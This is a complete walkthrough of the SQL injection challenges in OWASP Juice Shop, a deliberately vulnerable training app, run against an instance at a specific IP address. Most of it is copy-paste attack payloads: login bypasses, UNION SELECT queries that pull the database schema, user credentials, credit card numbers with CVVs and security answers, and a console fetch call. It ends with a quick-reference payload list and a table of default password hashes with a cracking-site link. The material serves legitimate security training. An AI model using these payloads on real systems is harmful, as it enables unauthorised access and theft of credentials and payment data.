# Complete SQL Injection Challenge Guide - OWASP Juice Shop

## All SQL Injection Challenges with Exact Step-by-Step Instructions

---

# Challenge 1: Login Admin (⭐⭐ - 200 points)
**Goal:** Log in with the administrator's user account

### Step-by-Step Instructions:

1. **Navigate to Login Page**
   - Click the **Account** button (person icon) in top-right corner
   - Select **Login** from dropdown menu
   - URL should be: `http://155.138.197.128:3003/#/login`

2. **Locate Input Fields**
   - You'll see two input boxes:
     - **Email** field (top one)
     - **Password** field (bottom one)
   - And a blue **Log in** button

3. **Enter the SQL Injection Payload**
   - Click inside the **Email** field
   - Type EXACTLY: `admin@juice-sh.op'--`
   - Click inside the **Password** field  
   - Type anything (literally anything like: `x` or `123`)

4. **Execute the Attack**
   - Click the blue **Log in** button
   - Alternative: Press Enter key

5. **Success Indicators**
   - Green success notification appears
   - Top-right shows "admin@juice-sh.op" instead of "Account"
   - Challenge completion popup appears
   - Score increases by 200 points

### Why It Works:
The `'--` closes the email string and comments out the password check, making the query:
```sql
SELECT * FROM Users WHERE email = 'admin@juice-sh.op'--' AND password = 'x'
```

---

# Challenge 2: Login Jim (⭐⭐ - 200 points)
**Goal:** Log in with Jim's user account

### Step-by-Step Instructions:

1. **Go to Login Page** 
   - If not there: Click **Account** → **Login**

2. **Enter Jim's Injection**
   - **Email field:** `jim@juice-sh.op'--`
   - **Password field:** `anything`

3. **Click Log in**

4. **Success:** You're logged in as Jim (Star Trek fan)

### Alternative Method with Password:
- **Email:** `jim@juice-sh.op`
- **Password:** `ncc-1701`
(But SQL injection is more fun!)

---

# Challenge 3: Login Bender (⭐⭐⭐ - 250 points)
**Goal:** Log in with Bender's user account

### Step-by-Step Instructions:

1. **First, Find Bender's Email**
   - Go to: `http://155.138.197.128:3003/#/search`
   - In search box, paste:
   ```
   test'))UNION SELECT 1,2,3,4,group_concat(email),6,7,8,9 FROM Users--
   ```
   - Look for `bender@juice-sh.op` in results

2. **Login as Bender**
   - Go to Login page
   - **Email:** `bender@juice-sh.op'--`
   - **Password:** `anything`
   - Click **Log in**

3. **Success:** Logged in as Bender (Futurama robot)

---

# Challenge 4: Database Schema (⭐⭐⭐⭐ - 350 points)
**Goal:** Exfiltrate the entire DB schema definition via SQL Injection

### Step-by-Step Instructions:

1. **Navigate to Search**
   - Click the **magnifying glass** icon in top navigation
   - Or go to: `http://155.138.197.128:3003/#/search`

2. **Extract Schema - Method 1 (Search Box)**
   - Click in the search box
   - Paste EXACTLY:
   ```
   test'))UNION SELECT 1,2,3,4,group_concat(sql),6,7,8,9 FROM sqlite_master--
   ```
   - Press Enter

3. **View the Schema**
   - Open Developer Tools (F12)
   - Go to **Network** tab
   - Look for `search?q=` request
   - Click it → **Response** tab
   - You'll see all CREATE TABLE statements

4. **Alternative Method (Direct URL)**
   - Open new tab
   - Paste this URL:
   ```
   http://155.138.197.128:3003/rest/products/search?q=test'))UNION%20SELECT%201,2,3,4,group_concat(sql),6,7,8,9%20FROM%20sqlite_master--
   ```

5. **Success:** Challenge completes when full schema is extracted

---

# Challenge 5: Ephemeral Accountant (⭐⭐⭐⭐ - 400 points)
**Goal:** Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op

### Step-by-Step Instructions:

1. **Understanding the Challenge**
   - User doesn't exist in database
   - Need to use UNION to create fake result

2. **Go to Login Page**

3. **Use UNION Injection**
   - **Email field:** 
   ```
   ' UNION SELECT * FROM (SELECT 1 as id, '' as username, 'acc0unt4nt@juice-sh.op' as email, '202cb962ac59075b964b07152d234b70' as password, 'accounting' as role, '' as deluxeToken, '' as lastLoginIp, '' as profileImage, '' as totpSecret, 1 as isActive, '2020-01-01' as createdAt, '2020-01-01' as updatedAt, null as deletedAt)--
   ```
   - **Password field:** `123`

4. **Success:** Logged in as non-existent accountant

---

# Challenge 6: User Credentials (⭐⭐⭐ - 300 points)
**Goal:** Retrieve a list of all user credentials via SQL Injection

### Step-by-Step Instructions:

1. **Go to Search Page**
   - Click magnifying glass icon

2. **Extract All Credentials**
   - In search box, paste:
   ```
   x'))UNION SELECT 1,2,3,4,group_concat(email||':'||password),6,7,8,9 FROM Users--
   ```
   - Press Enter

3. **View Results - Method 1 (Direct URL)**
   - Open new tab, paste:
   ```
   http://155.138.197.128:3003/rest/products/search?q=x'))UNION%20SELECT%201,2,3,4,group_concat(email||':'||password),6,7,8,9%20FROM%20Users--
   ```

4. **View Results - Method 2 (Console)**
   - Press F12 → Console
   - Type: `allow pasting` and press Enter
   - Paste:
   ```javascript
   fetch("http://155.138.197.128:3003/rest/products/search?q=x'))UNION%20SELECT%201,2,3,4,group_concat(email||':'||password),6,7,8,9%20FROM%20Users--")
     .then(r => r.json())
     .then(d => console.log(d.data[0].deluxePrice));
   ```

5. **Success:** You'll see all emails with password hashes

---

# Challenge 7: Login Amy (⭐⭐ - 200 points)
**Goal:** Log in with Amy's user account

### Instructions:
1. **Login Page**
   - **Email:** `amy@juice-sh.op'--`
   - **Password:** `anything`
   - Click **Log in**

---

# Challenge 8: Login Bjoern (⭐⭐⭐⭐ - 400 points)
**Goal:** Log in with Bjoern's Gmail account

### Instructions:

1. **Find Bjoern's Email First**
   - Search box:
   ```
   x'))UNION SELECT 1,2,3,4,group_concat(email),6,7,8,9 FROM Users--
   ```
   - Look for Gmail addresses

2. **Login**
   - **Email:** `bjoern@gmail.com'--`
   - **Password:** `anything`

---

# Challenge 9: Login CISO (⭐⭐⭐⭐⭐ - 500 points)
**Goal:** Exploit OAuth login to log in as CISO

### Instructions:

1. **Find CISO Email**
   - Search injection:
   ```
   x'))UNION SELECT 1,2,3,4,group_concat(email||':'||role),6,7,8,9 FROM Users--
   ```

2. **Exploit OAuth**
   - This requires manipulating OAuth tokens
   - More complex than basic SQL injection

---

# Challenge 10: Christmas Special (⭐⭐⭐⭐ - 350 points)
**Goal:** Order the Christmas special offer

### Instructions:

1. **Find Hidden Products**
   - Search box:
   ```
   x'))UNION SELECT 1,2,3,4,name||':'||id,6,7,8,9 FROM Products--
   ```
   - Look for Christmas Special product ID

2. **Add to Basket via API**
   - Use browser console to add hidden product

---

# Bonus: Extract Everything

## Get All Tables at Once:
```
http://155.138.197.128:3003/rest/products/search?q='))UNION%20SELECT%201,2,3,4,group_concat(name),6,7,8,9%20FROM%20sqlite_master%20WHERE%20type='table'--
```

## Get All User Data:
```
http://155.138.197.128:3003/rest/products/search?q='))UNION%20SELECT%201,2,3,4,group_concat(id||'|'||email||'|'||password||'|'||role),6,7,8,9%20FROM%20Users--
```

## Get All Credit Cards:
```
http://155.138.197.128:3003/rest/products/search?q='))UNION%20SELECT%201,2,3,4,group_concat(fullName||':'||cardNum||':'||cvv),6,7,8,9%20FROM%20Cards--
```

## Get All Security Answers:
```
http://155.138.197.128:3003/rest/products/search?q='))UNION%20SELECT%201,2,3,4,group_concat(answer),6,7,8,9%20FROM%20SecurityAnswers--
```

---

# Quick Reference - Common Payloads

## Login Bypasses:
```sql
admin@juice-sh.op'--
' OR '1'='1'--
' OR 1=1--
admin'--
' UNION SELECT null--
```

## Search Extractions:
```sql
'))UNION SELECT 1,2,3,4,5,6,7,8,9--
'))UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
'))ORDER BY 9--
```

## Where to Find Each Input:

1. **Login Page** (`/login`)
   - Email field
   - Password field

2. **Search Box** (`/search`)
   - Product search field (magnifying glass)

3. **User Registration** (`/register`)
   - Email field
   - Password field
   - Security answer

4. **Customer Feedback** (`/contact`)
   - Rating parameter (needs DevTools)
   - Comment field

5. **Product Reviews** (`/products/[id]`)
   - Review text field

6. **Coupon Field** (in basket)
   - Coupon code input

---

# Success Verification

## How to Know It Worked:

1. **Login Challenges:**
   - Green notification "Login successful"
   - Username appears in top-right
   - Challenge solved popup

2. **Data Extraction:**
   - Data appears in response
   - Check F12 → Network → Response
   - Or see raw JSON in new tab

3. **Score Check:**
   - Click on score (top-left)
   - Shows solved challenges
   - Green checkmarks appear

## Common Issues:

**"No results found"**
- Query worked but no visible output
- Check Network tab for actual data

**"Invalid email or password"**
- Typo in payload
- Missing quotes or dashes
- Try copy-paste exactly

**"500 Internal Server Error"**
- Syntax error in SQL
- Wrong number of columns
- Check your quotes and parentheses

---

# Password Hash Reference

| User | Email | MD5 Hash | Password |
|------|-------|----------|----------|
| Admin | admin@juice-sh.op | 0192023a7bbd73250516f069df18b500 | admin123 |
| Jim | jim@juice-sh.op | e541ca7ecf72b8d1286474fc613e5e45 | ncc-1701 |
| Bender | bender@juice-sh.op | 0c36e517e3fa95aabf1bbffc6744a4ef | booze |
| Amy | amy@juice-sh.op | 030f05e45e30710c3ad3c32f00de0473 | K1f....................Oo! |
| MC SafeSearch | mc.safesearch@juice-sh.op | b03f4b0ba8b458fa0acdc02cdb953bc8 | Mr. N00dles |

Crack unknown hashes at: https://crackstation.net/

---

Remember: These are educational challenges on your own CTF instance. Never perform SQL injection on systems you don't own!